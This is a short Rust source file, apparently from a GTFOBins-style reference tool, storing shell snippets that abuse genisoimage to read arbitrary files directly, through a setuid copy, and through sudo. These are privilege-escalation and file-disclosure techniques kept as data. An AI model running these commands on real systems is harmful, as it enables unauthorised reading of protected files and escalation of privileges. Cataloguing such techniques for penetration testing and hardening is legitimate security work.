pub static BIN_NAME: &'static str = "genisoimage";
pub static BIN_DESC: &'static str = "The output is placed inside the ISO9660 file system binary format thus it may not be suitable for binary content as is, yet it can be mounted or extracted with tools like `7z`.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    genisoimage -q -o - "$LFILE"
"#;
pub static SUID_DESC: &'static str = "The file is parsed, and some of its content is disclosed by the error messages, thus this might not be suitable to read arbitrary data.";
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which genisoimage) .

    LFILE=file_to_read
    ./genisoimage -sort "$LFILE"
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_read
    sudo genisoimage -q -o - "$LFILE"
"#;
use crate::code::{Code, Tag};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
